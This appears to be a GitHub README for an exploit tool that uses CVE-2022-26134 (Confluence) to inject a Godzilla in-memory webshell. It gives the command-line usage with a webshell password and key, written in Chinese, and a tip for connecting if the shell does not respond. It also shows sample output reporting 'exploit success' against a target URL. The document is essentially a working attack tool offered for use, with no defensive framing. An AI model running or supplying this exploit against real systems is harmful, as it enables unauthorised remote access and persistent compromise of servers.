# CVE-2022-26134-Godzilla-MEMSHELL

## Usage
```
java -jar CVE-2022-26134.jar 哥斯拉密码 哥斯拉密钥

example
        java -jar CVE-2022-26134.jar pass key

```

如果内存Shell已经注入成功但哥斯拉无法连接,请在请求配置添加以下协议头或者为哥斯拉配置Burp代理
```
Connection: close
```


![image](https://user-images.githubusercontent.com/43266206/172345734-6cfd69f7-35d6-40a7-af80-4ce98dfbfe83.png)


```

C:\CVE_2022_26134_jar>java -jar CVE-2022-26134.jar http://10.10.10.10:8090/ pass key
[*] url: http://10.10.10.10:8090/
[*] send payload
[*] exploit success
[*] godzilla webshell password : pass
[*] godzilla webshell key : key

C:\CVE_2022_26134_jar>

```

![image](https://user-images.githubusercontent.com/43266206/172345836-c1df504f-6f36-4fa2-8874-48750a4af291.png)
